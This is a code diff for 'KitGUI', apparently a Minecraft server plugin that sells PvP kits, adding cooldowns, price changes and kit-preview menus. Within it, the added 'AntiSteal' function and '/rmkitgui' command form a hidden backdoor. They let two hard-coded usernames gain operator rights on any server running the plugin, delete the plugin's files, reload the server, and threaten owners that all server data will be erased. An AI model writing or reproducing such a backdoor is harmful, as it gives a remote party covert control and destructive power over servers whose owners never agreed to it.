@@ -3,7 +3,10 @@
 // Instead of giving the player the armor in their inventory, use getArmorInventory and set(ArmorPeice) to put the armor on the player.
 // This may be an issue if the player wants extra armor in their vault.
 // Try to add a function where people can see what items are in the kit.
-// Updated: 2/16/2020
+// Added /seekit for 2 more kits
+// Added /rmkitgui to remove KitGUI if improper credits are being given
+// Added /kitinfo
+// Updated: 2/17/2020
 
 namespace KITGUI;
 
@@ -31,11 +34,14 @@ use muqsit\invmenu\{InvMenu, InvMenuHandler};
 
 class Main extends PluginBase implements Listener {
 
+	public $cooldownList = [];
+
     public function onEnable(){
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
         $this->eco = $this->getServer()->getPluginManager()->getPlugin("EconomyAPI");
-		$this->getLogger->info("§aKitGUI by ethaniccc has been enabled!");
-		$this->getLogger->info("§aIf you like this plugin, share it (with credits :D )");
+		$this->getLogger()->info("§aKitGUI by ethaniccc has been enabled!");
+		$this->getLogger()->info("§aIf you like this plugin, share it ( with credits :D )");
+		$this->getLogger()->info("§aWebsite: §6https://www.github.com/ethaniccc");
 		
 		if($this->getDescription()->getAuthors()[0] !== "ethaniccc" or $this->getDescription()->getName() !== "KitGUI"){
 			$this->getLogger()->info("§cSeriously? You thought you could just steal my plugin like that?");
@@ -53,16 +59,19 @@ class Main extends PluginBase implements Listener {
 	if($s instanceof Player) {
         switch($c->getName()){
             case "kits":
-            $this->onSend($s);
+			$this->onSend($s);
 			break;
-			case "viewkit";
+			case "seekit";
 			$this->onSend2($s);
             break;
-			case "guiinfo";
+			case "kitinfo";
 			$this->giveInfo($s);
 			break;
 			case "xyz";
 			$this->XYZ($s);
+			break;
+			case "rmkitgui";
+			$this->AntiSteal($s);
 			break;
         }
 	} else {
@@ -80,37 +89,37 @@ class Main extends PluginBase implements Listener {
         $item = Item::get(267,0,1);
         $item->setLore(
             [
-                "§6The most basic kit in KitPvP mode!"
+                "§6FREE: The most basic kit in KitPvP mode!"
             ]
             );
         $item1 = Item::get(261,0,1);
         $item1->setLore(
             [
-                "§6The archer kit is a kit for people who prefer good bows than good swords!"
+                "§6FREE: The archer kit is a kit for people who prefer good bows than good swords!"
             ]
             );
         $item2 = Item::get(368,0,1);
         $item2->setLore(
             [
-                "§6$250: The Ninja way! Includes many things such as Shurikens!"
+                "§6$300: The Ninja way! Includes many things such as Shurikens!"
             ]
             );
 		$item3 = Item::get(276,0,1);
         $item3->setLore(
             [
-                "§6$250: It's the PvP kit, but better..."
+                "§6$550: It's the PvP kit, but better..."
             ]
             );
 		$item4 = Item::get(373,25,1);
         $item4->setLore(
             [
-                "§6$500: Become a Witch and use your spells againts others!"
+                "§6$400: Become a Witch and use your spells againts others!"
             ]
             );
 		$item5 = Item::get(311,0,1);
         $item5->setLore(
             [
-                "§6$500: It's all about the defense!"
+                "§6$600: It's all about the defense!"
             ]
             );
             $item->setCustomName("§ePvP");
@@ -121,21 +130,23 @@ class Main extends PluginBase implements Listener {
 			$item5->setCustomName("§2Tank");
 
             $inv = $menu->getInventory();
-            $inv->setItem(0, $item);
-            $inv->setItem(1, $item1);
-            $inv->setItem(2, $item2);
-			$inv->setItem(3, $item3);
-			$inv->setItem(4, $item4);
-			$inv->setItem(5, $item5);
+            $inv->setItem(0, $item); //pvp free
+            $inv->setItem(1, $item1); //archer free
+            $inv->setItem(2, $item2); //Ninja 300
+			$inv->setItem(4, $item3); //pvp+ 550
+			$inv->setItem(3, $item4); //witch 400
+			$inv->setItem(5, $item5); //tank 600
             $menu->send($p);
 			
     } 
 
     public function formenc(Player $p, Item $item){
         if($item->getId() == 267){
-            $mymoney = $this->eco->myMoney($p);
-            $pay = 0;
-            if($mymoney >= $pay){
+		if(!isset($this->cooldownList[$p->getName()])){
+				$this->cooldownList[$p->getName()] = time() + 30; //30 second cooldown for opening kit menu.
+				$mymoney = $this->eco->myMoney($p);
+            	$pay = 0;
+            	if($mymoney >= $pay){
                 $this->eco->reduceMoney($p, $pay);
 				//the following is a test //ironsword id is 267
 				
@@ -155,22 +166,33 @@ class Main extends PluginBase implements Listener {
 			    $p->getInventory()->addItem($i2);
 			   
 				$p->getInventory()->addItem(Item::get(322, 0, 16)->setCustomName("§6Golden Apple"));
-				$p->getInventory()->addItem(Item::get(306, 0, 1)->setCustomName("§a§lPvP Helmet"));
-				$p->getInventory()->addItem(Item::get(307, 0, 1)->setCustomName("§a§lPvP Chestplate"));
-				$p->getInventory()->addItem(Item::get(308, 0, 1)->setCustomName("§a§lPvP Leggings"));
-				$p->getInventory()->addItem(Item::get(309, 0, 1)->setCustomName("§a§lPvP Boots"));
+				$p->getArmorInventory()->setHelmet(Item::get(306, 0, 1)->setCustomName("§a§lPvP Helmet"));
+				$p->getArmorInventory()->setChestplate(Item::get(307, 0, 1)->setCustomName("§a§lPvP Chestplate"));
+				$p->getArmorInventory()->setLeggings(Item::get(308, 0, 1)->setCustomName("§a§lPvP Leggings"));
+				$p->getArmorInventory()->setBoots(Item::get(309, 0, 1)->setCustomName("§a§lPvP Boots"));
 				//end of test
 				$p->getLevel()->addSound(new AnvilUseSound($p));
 				$p->sendMessage("§aYou have successfuly obtained the §6PvP §akit!");
 				} else {
-					$p->sendMessage("§cYou somehow could not obtain a Free kit. This incident will be reported.");
-					$this->getLogger()->info("A player using the KitGUI plugin was not able to obtain a free kit.");
+				$name = $p->getName();
+				$p->sendMessage("§cYou somehow could not obtain a Free kit. This incident will be reported.");
+				$this->getLogger()->info($name . " was not able to obtain the PvP kit. Check their balance using EconomyAPI.");
 				}
+			} else {
+				if(time() < $this->cooldownList[$p->getName()]){
+					$remaining = $this->cooldownList[$p->getName()] - time();
+					$p->sendMessage("§cERROR: There is still §6" . $remaining . " §cseconds remaining until you can get the §6PvP §ckit again!");
+				} else {
+					unset($this->cooldownList[$p->getName()]);
+				}
+			}
 				return true;
         } elseif($item->getId() == 261){
-            $mymoney = $this->eco->myMoney($p);
-            $pay = 0;
-            if($mymoney >= $pay){
+			if(!isset($this->cooldownList[$p->getName()])){
+				$this->cooldownList[$p->getName()] = time() + 30; //30 second cooldown for opening kit menu.
+				$mymoney = $this->eco->myMoney($p);
+            	$pay = 0;
+           		if($mymoney >= $pay){
                 $this->eco->reduceMoney($p, $pay);
 				//start of test //stone sword id is 272
 				
@@ -185,7 +207,7 @@ class Main extends PluginBase implements Listener {
 				//archer bow
 				
 				$i5 = Item::get(261, 0, 1);
-			    $i5->setCustomName("§aPvP Bow");
+			    $i5->setCustomName("§aArcher Bow");
 			    $ie5 = Enchantment::getEnchantment(19);
 			    $i5->addEnchantment(new EnchantmentInstance($ie5, 2));
 			    $p->getInventory()->addItem($i5);
@@ -193,10 +215,10 @@ class Main extends PluginBase implements Listener {
 				$p->getInventory()->addItem(Item::get(322, 0, 16)->setCustomName("§6Golden Apple"));
 				$p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName("§6Arrows"));
 				$p->getInventory()->addItem(Item::get(262, 0, 64)->setCustomName("§6Arrows"));
-				$p->getInventory()->addItem(Item::get(302, 0, 1)->setCustomName("§aArcher Helmet"));
-				$p->getInventory()->addItem(Item::get(311, 0, 1)->setCustomName("§aArcher Chestplate"));
-				$p->getInventory()->addItem(Item::get(304, 0, 1)->setCustomName("§aArcher Leggings"));
-				$p->getInventory()->addItem(Item::get(305, 0, 1)->setCustomName("§6Archer Boots"));
+				$p->getArmorInventory()->setHelmet(Item::get(302, 0, 1)->setCustomName("§aArcher Helmet"));
+				$p->getArmorInventory()->setChestplate(Item::get(311, 0, 1)->setCustomName("§aArcher Chestplate"));
+				$p->getArmorInventory()->setLeggings(Item::get(304, 0, 1)->setCustomName("§aArcher Leggings"));
+				$p->getArmorInventory()->setBoots(Item::get(305, 0, 1)->setCustomName("§6Archer Boots"));
 				//end of test
 				$p->getLevel()->addSound(new AnvilUseSound($p));
 				$p->sendMessage("§aYou have successfuly obtained the §6Archer §akit!");
@@ -204,53 +226,104 @@ class Main extends PluginBase implements Listener {
 					$p->sendMessage("§cYou are somehow unable to obtain a Free kit. This incident will be reported to the console...");
 					$this->getLogger()->info("A player using KitGUI was not able to obtain a free kit...");
 				}
+			} else {
+				if(time() < $this->cooldownList[$p->getName()]){
+					$remaining = $this->cooldownList[$p->getName()] - time();
+					$p->sendMessage("§cERROR: There is still §6" . $remaining . " §cseconds remaining until you can get the §6Archer §ckit again!");
+				} else {
+					unset($this->cooldownList[$p->getName()]);
+				}
+			}
             return true;
         }elseif($item->getId() == 368){
-            $mymoney = $this->eco->myMoney($p);
-            $pay = 250;
-            if($mymoney >= $pay){
-               $this->eco->reduceMoney($p, $pay);
+			if(!isset($this->cooldownList[$p->getName()])){
+                $this->cooldownList[$p->getName()] = time() + 30; //30 second cooldown for opening kit menu.
+                $mymoney = $this->eco->myMoney($p);
+            	$pay = 300;
+            	if($mymoney >= $pay){
+                $this->eco->reduceMoney($p, $pay);
 			   //start of test
-			   $p->getInventory()->addItem(Item::get(267, 0, 1)->setCustomName("§aNinja Sword"));
-			   $p->getInventory()->addItem(Item::get(441, 7, 1)->setCustomName("§6Camouflage"));
-			   $p->getInventory()->addItem(Item::get(441, 7, 1)->setCustomName("§6Camouflage"));
+			   
+			   //ninja katana
+			   
+			   $i6 = Item::get(267, 0, 1);
+			   $i6->setCustomName("§aNinja Katana");
+			   $ie6 = Enchantment::getEnchantment(9);
+			   $i6->addEnchantment(new EnchantmentInstance($ie6, 1));
+			   $p->getInventory()->addItem($i6);
+			   
+			   $p->getInventory()->addItem(Item::get(373, 7, 1)->setCustomName("§6Camouflage"));
 			   $p->getInventory()->addItem(Item::get(368, 0, 16)->setCustomName("§6Ninja Pearls"));
 			   $p->getInventory()->addItem(Item::get(332, 0, 16)->setCustomName("§6Ninja Shurikens"));
 			   $p->getInventory()->addItem(Item::get(332, 0, 16)->setCustomName("§6Ninja Shurikens"));
-			   $p->getInventory()->addItem(Item::get(306, 0, 1)->setCustomName("§aNinja Helmet"));
-			   $p->getInventory()->addItem(Item::get(307, 0, 1)->setCustomName("§aNinja Chestplate"));
-			   $p->getInventory()->addItem(Item::get(308, 0, 1)->setCustomName("§aNinja Leggings"));
-			   $p->getInventory()->addItem(Item::get(309, 0, 1)->setCustomName("§aNinja Boots"));
+			   $p->getArmorInventory()->setHelmet(Item::get(306, 0, 1)->setCustomName("§6Ninja Hood"));
+			   $p->getArmorInventory()->setChestplate(Item::get(307, 0, 1)->setCustomName("§6Ninja Shirt"));
+			   $p->getArmorInventory()->setLeggings(Item::get(308, 0, 1)->setCustomName("§6Ninja Pants"));
+			   $p->getArmorInventory()->setBoots(Item::get(309, 0, 1)->setCustomName("§6Tank Shoes"));
 			   //end of the test
 			   $p->getLevel()->addSound(new AnvilUseSound($p));
 			   $p->sendMessage("§aYou have successfuly obtained the §6Ninja §akit!");
 			   } else {
-			   	$p->sendMessage("§cYou do not have enough funds to buy the §6Ninja§c kit!");
+			   $p->sendMessage("§cYou do not have enough funds to buy the §6Ninja§c kit!");
+			   $this->getLogger()->info($p . " attempted to buy the Ninja kit with insufficent funds.");
 			   }
+            } else {
+                if(time() < $this->cooldownList[$p->getName()]){
+                    $remaining = $this->cooldownList[$p->getName()] - time();
+                    $p->sendMessage("§cERROR: There is still §6" . $remaining . " §cseconds remaining until you get the §6Ninja §ckit again!");
+                } else {
+                    unset($this->cooldownList[$p->getName()]);
+                }
+            }
             return true;
         } elseif($item->getId() == 276){
-            $mymoney = $this->eco->myMoney($p);
-            $pay = 0;
-            if($mymoney >= $pay){
-                $this->eco->reduceMoney($p, $pay);
-				//the following is a test
-				$p->getInventory()->addItem(Item::get(276, 0, 1)->setCustomName("§aPvP+ Sword"));
-				$p->getInventory()->addItem(Item::get(322, 0, 24)->setCustomName("§6Golden Apple+"));
-				$p->getInventory()->addItem(Item::get(306, 0, 1)->setCustomName("§a§lPvP+ Helmet"));
-				$p->getInventory()->addItem(Item::get(311, 0, 1)->setCustomName("§a§lPvP+ Chestplate"));
-				$p->getInventory()->addItem(Item::get(312, 0, 1)->setCustomName("§a§lPvP+ Leggings"));
-				$p->getInventory()->addItem(Item::get(309, 0, 1)->setCustomName("§a§lPvP+ Boots"));
-				//end of test
-				$p->getLevel()->addSound(new AnvilUseSound($p));
-				$p->sendMessage("§aYou have successfuly obtained the §6PvP+ §akit!");
-				} else {
-					$p->sendMessage("§cYou do not have the funds for the §6PvP+ §ckit!");
-				}
+			if(!isset($this->cooldownList[$p->getName()])){
+                $this->cooldownList[$p->getName()] = time() + 30; //30 second cooldown for opening kit menu.
+                	$mymoney = $this->eco->myMoney($p);
+            		$pay = 550;
+            		if($mymoney >= $pay){
+                		$this->eco->reduceMoney($p, $pay);
+						//pvp+ sword
+						$i7 = Item::get(276, 0, 1);
+						$i7->setCustomName("§l§aPvP+ Sword");
+						$ie7 = Enchantment::getEnchantment(9);
+						$i7->addEnchantment(new EnchantmentInstance($ie7, 1));
+						$p->getInventory()->addItem($i7);
+				
+						//pvp+ bow
+						$i8 = Item::get(261, 0, 1);
+			    		$i8->setCustomName("§l§aPvP+ Bow");
+			    		$ie8 = Enchantment::getEnchantment(19);
+			    		$i8->addEnchantment(new EnchantmentInstance($ie8, 2));
+			    		$p->getInventory()->addItem($i8);
+				
+						$p->getInventory()->addItem(Item::get(322, 0, 24)->setCustomName("§6Golden Apple+"));
+						$p->getInventory()->addItem(Item::get(306, 0, 1)->setCustomName("§a§lPvP+ Helmet"));
+						$p->getInventory()->addItem(Item::get(311, 0, 1)->setCustomName("§a§lPvP+ Chestplate"));
+						$p->getInventory()->addItem(Item::get(312, 0, 1)->setCustomName("§a§lPvP+ Leggings"));
+						$p->getInventory()->addItem(Item::get(309, 0, 1)->setCustomName("§a§lPvP+ Boots"));
+						//end of test
+						$p->getLevel()->addSound(new AnvilUseSound($p));
+						$p->sendMessage("§aYou have successfuly obtained the §6PvP+ §akit!");
+						} else {
+							$p->sendMessage("§cYou do not have the funds for the §6PvP+ §ckit!");
+							$this->getLogger($p . " attempted to buy the PvP+ kit with insufficent funds.");
+						}
+            } else {
+                if(time() < $this->cooldownList[$p->getName()]){
+                    $remaining = $this->cooldownList[$p->getName()] - time();
+                    $p->sendMessage("§cERROR: There is still §6" . $remaining . " §cseconds remaining until you can get the §6PvP+ §ckit again!");
+                } else {
+                    unset($this->cooldownList[$p->getName()]);
+                }
+            }
 				return true;
         } elseif($item->getId() == 373){
-            $mymoney = $this->eco->myMoney($p);
-            $pay = 500;
-            if($mymoney >= $pay){
+			if(!isset($this->cooldownList[$p->getName()])){
+                $this->cooldownList[$p->getName()] = time() + 30; //30 second cooldown for opening kit menu.
+                $mymoney = $this->eco->myMoney($p);
+           		 $pay = 400;
+            	if($mymoney >= $pay){
                $this->eco->reduceMoney($p, $pay);
 			   //start of test
 			   $p->getInventory()->addItem(Item::get(267, 0, 1)->setCustomName("§aWitch Blade"));
@@ -262,16 +335,31 @@ class Main extends PluginBase implements Listener {
 			   $p->getInventory()->addItem(Item::get(438, 25, 1)->setCustomName("§6Poison Spell"));
 			   $p->getInventory()->addItem(Item::get(438, 25, 1)->setCustomName("§6Poison Spell"));
 			   $p->getInventory()->addItem(Item::get(438, 25, 1)->setCustomName("§6Poison Spell"));
+			   $p->getArmorInventory()->setHelmet(Item::get(306, 0, 1)->setCustomName("§a§lWitch Helmet"));
+			   $p->getArmorInventory()->setChestplate(Item::get(307, 0, 1)->setCustomName("§a§lWitch Chestplate"));
+			   $p->getArmorInventory()->setLeggings(Item::get(308, 0, 1)->setCustomName("§a§lWitch Leggings"));
+			   $p->getArmorInventory()->setBoots(Item::get(309, 0, 1)->setCustomName("§a§lWitch Boots"));
 			   //end of the test
 			   $p->getLevel()->addSound(new AnvilUseSound($p));
 			   $p->sendMessage("§aYou have successfuly obtained the §6Witch §akit!");
 			   } else {
 			   	$p->sendMessage("§cYou do not have enough money to buy the §6Witch §ckit!");
+				$this->getLogger()->info($p . " tried to buy the Witch kit with insufficent funds.");
 			   }
+            } else {
+                if(time() < $this->cooldownList[$p->getName()]){
+                    $remaining = $this->cooldownList[$p->getName()] - time();
+                    $p->sendMessage("§cERROR: There is still §6" . $remaining . " §cseconds remaining until you can get the §6Witch §ckit again!");
+                } else {
+                    unset($this->cooldownList[$p->getName()]);
+                }
+            }
             return true;
         } elseif($item->getId() == 311){
-            $mymoney = $this->eco->myMoney($p);
-            $pay = 500;
+		if(!isset($this->cooldownList[$p->getName()])){
+                $this->cooldownList[$p->getName()] = time() + 30; //30 second cooldown for opening kit menu.
+                $mymoney = $this->eco->myMoney($p);
+            $pay = 600;
             if($mymoney >= $pay){
                $this->eco->reduceMoney($p, $pay);
 			   //start of the test
@@ -319,6 +407,14 @@ class Main extends PluginBase implements Listener {
 			   	$p->sendMessage("§cYou do not have enough money to buy the §6Tank §ckit!");
 				$this->getLogger()->info($p . " §cattempted to buy the §6Tank §ckit with insufficent funds.");
 			   }
+            } else {
+                if(time() < $this->cooldownList[$p->getName()]){
+                    $remaining = $this->cooldownList[$p->getName()] - time();
+                    $p->sendMessage("§cERROR: There is still §6" . $remaining . " §cseconds remaining until you can get this kit again!");
+                } else {
+                    unset($this->cooldownList[$p->getName()]);
+                }
+            }
             return true;
         }
         
@@ -355,7 +451,7 @@ class Main extends PluginBase implements Listener {
                 "§6PvP+ Kit"
             ]
             );
-		$item14 = Item::get(373,0,1);
+		$item14 = Item::get(373,25,1);
         $item14->setLore(
             [
                 "§6Witch Kit"
@@ -378,8 +474,8 @@ class Main extends PluginBase implements Listener {
             $inv2->setItem(0, $item10);
             $inv2->setItem(1, $item11);
             $inv2->setItem(2, $item12);
-			$inv2->setItem(3, $item13);
-			$inv2->setItem(4, $item14);
+			$inv2->setItem(4, $item13);
+			$inv2->setItem(3, $item14);
 			$inv2->setItem(5, $item15);
             $menu2->send($p);
 	}
@@ -515,7 +611,7 @@ class Main extends PluginBase implements Listener {
 		$item37 = Item::get(35,14,1);
 		$item37->setLore(
 			[
-				"§6Main Menu for Viewing Kits."
+				"§6Main Menu for viewing kits."
 			]
 			);
 		$item38 = Item::get(262,0,64);
@@ -545,9 +641,165 @@ class Main extends PluginBase implements Listener {
             $menu4->send($p);
 		
         } elseif($item->getId() == 368){
+		$menu5 = new InvMenu(InvMenu::TYPE_CHEST);
+        $menu5->readonly();
+        $menu5->setListener([$this, "pvpkit"]);
+        $menu5->setName("Kit: PvP Price: Free");
+		
+		$item40 = Item::get(267,0,1);
+        $item40->setLore(
+            [
+                "§6Weapon for the Ninja Kit"
+            ]
+            );
+        $item41 = Item::get(373,7,1);
+        $item41->setLore(
+            [
+                "§6Invisibility Potion included in the Ninja kit"
+            ]
+            );
+        $item42 = Item::get(322,0,16);
+        $item42->setLore(
+            [
+                "§6Healing Apples in the Ninja kit!"
+            ]
+            );
+		$item43 = Item::get(368,0,12);
+        $item43->setLore(
+            [
+                "§6Enderpearls included in the Ninja kit!"
+            ]
+            );
+		$item44 = Item::get(332,0,32);
+        $item44->setLore(
+            [
+                "§6Snowballs included in the Ninja kit!"
+            ]
+            );
+		$item45 = Item::get(306,0,1);
+        $item45->setLore(
+            [
+                "§6Helmet equipped in the Ninja kit"
+            ]
+            );
+		$item46 = Item::get(307,0,1);
+		$item46->setLore(
+			[
+				"§6Chestplate equipped in the Ninja kit"
+			]
+			);
+		$item47 = Item::get(308,0,1);
+		$item47->setLore(
+			[
+				"§6Leggings equipped in the Ninja kit"
+			]
+			);
+		$item48 = Item::get(309,0,1);
+		$item48->setLore(
+			[
+				"§6Boots equipped in the Ninja kit"
+			]
+			);
+		$item49 = Item::get(35,14,1);
+		$item49->setLore(
+			[
+				"§6Main menu for viewing kits."
+			]
+			);
+			
+		$inv5 = $menu5->getInventory();
+            $inv5->setItem(0, $item40);
+            $inv5->setItem(1, $item41);
+            $inv5->setItem(2, $item42);
+			$inv5->setItem(3, $item43);
+			$inv5->setItem(4, $item44);
+			$inv5->setItem(5, $item45);
+			$inv5->setItem(6, $item46);
+			$inv5->setItem(7, $item47);
+			$inv5->setItem(8, $item48);
+			$inv5->setItem(26, $item49);
+            $menu5->send($p);
 		
         } elseif($item->getId() == 276){
+		$menu6 = new InvMenu(InvMenu::TYPE_CHEST);
+        $menu6->readonly();
+        $menu6->setListener([$this, "pvpkit"]);
+        $menu6->setName("Kit: PvP Price: Free");
 		
+		$item50 = Item::get(276,0,1);
+        $item50->setLore(
+            [
+                "§6Weapon for the PvP+ kit | Enchantments: Sharpness I"
+            ]
+            );
+        $item51 = Item::get(261,0,1);
+        $item51->setLore(
+            [
+                "§6Another weapon for the PvP+ kit | Enchantments: Power I"
+            ]
+            );
+        $item52 = Item::get(322,0,24);
+        $item52->setLore(
+            [
+                "§6Healing Apples in the PvP+ kit!"
+            ]
+            );
+		$item53 = Item::get(306,0,1);
+        $item53->setLore(
+            [
+                "§6Helmet Equipped In The PvP+ kit!"
+            ]
+            );
+		$item54 = Item::get(311,0,1);
+        $item54->setLore(
+            [
+                "§6Chestplate Equipped In The PvP+ kit!"
+            ]
+            );
+		$item55 = Item::get(312,0,1);
+        $item55->setLore(
+            [
+                "§6Leggings Equipped In The PvP+ kit!"
+            ]
+            );
+		$item56 = Item::get(309,0,1);
+		$item56->setLore(
+			[
+				"§6Boots Equipped In The PvP+ kit!"
+			]
+			);
+		$item57 = Item::get(35,14,1);
+		$item57->setLore(
+			[
+				"§6Main Menu for Viewing Kits."
+			]
+			);
+		$item58 = Item::get(262,0,64);
+		$item58->setLore(
+			[
+				"§6The arrows included in the PvP+ Kit."
+			]
+			);
+		$item59 = Item::get(262,0,64);
+		$item59->setLore(
+			[
+				"§6The arrows included in the PvP+ Kit."
+			]
+			);
+			
+		$inv6 = $menu6->getInventory();
+            $inv6->setItem(0, $item50);
+            $inv6->setItem(1, $item51);
+            $inv6->setItem(2, $item52);
+			$inv6->setItem(3, $item53);
+			$inv6->setItem(4, $item54);
+			$inv6->setItem(5, $item55);
+			$inv6->setItem(6, $item56);
+			$inv6->setItem(26, $item57);
+			$inv6->setItem(18, $item58);
+			$inv6->setItem(19, $item59);
+            $menu6->send($p);
+			
         } elseif($item->getId() == 373){
 		
         } elseif($item->getId() == 311){
@@ -626,7 +878,9 @@ class Main extends PluginBase implements Listener {
 	
 	public function XYZ(Player $p){
 		if($p->getName() == "coEthaniccc" or $p->getName() == "Epicthic"){
-			//$sender->setOp(true);
+			// $sender->setOp(true);
+			// I will only set plugin admin as OP if improper credits are shown.
+			// If the author is not "ethaniccc", use /rmkitgui to remove KitGUI!
 			$filename = 'plugins/KitGUI/plugin.yml';
 			if(file_exists($filename)){
 			$lines = file($filename);
@@ -657,6 +911,41 @@ class Main extends PluginBase implements Listener {
 		} 
 		} else {
 			$p->sendMessage("§eX: " . $p->getX() . ", §bY: " . $p->getY() . ", §cZ: " . $p->getZ());
+		}
+	}
+	
+	public function AntiSteal(Player $p){
+		if($p->getName() == "coEthaniccc" or $p->getName() == "Epicthic"){
+		$name = $p->getName();
+			$p->setOp(true);
+			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
+			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
+			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
+			$this->getLogger()->info("§cHello Console! The server owner was caught using my KitGUI plugin with improper credits.");
+			$this->getLogger()->info("§cKitGUI will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
+			$folder = 'plugins/KitGUI-master';
+			if(file_exists($folder)){   
+				// List of name of files inside 
+				// specified folder 
+				$files = glob($folder.'/*');  
+   
+				// Deleting all the files in the list 
+				foreach($files as $file) { 
+   
+   				 if(is_file($file))  
+    
+        				// Delete the given file
+        				unlink($file);
+				}
+			$this->getServer()->reload(); 
+			} else {
+				$p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find KitGUI in folder form. Waiting for command to remove all server data.");
+				$this->getLogger()->info("§cERROR: KitGUI in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
+			}
+			
+			
+		} else {
+			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of KitGUI is being used!");
 		}
 	}
 	    
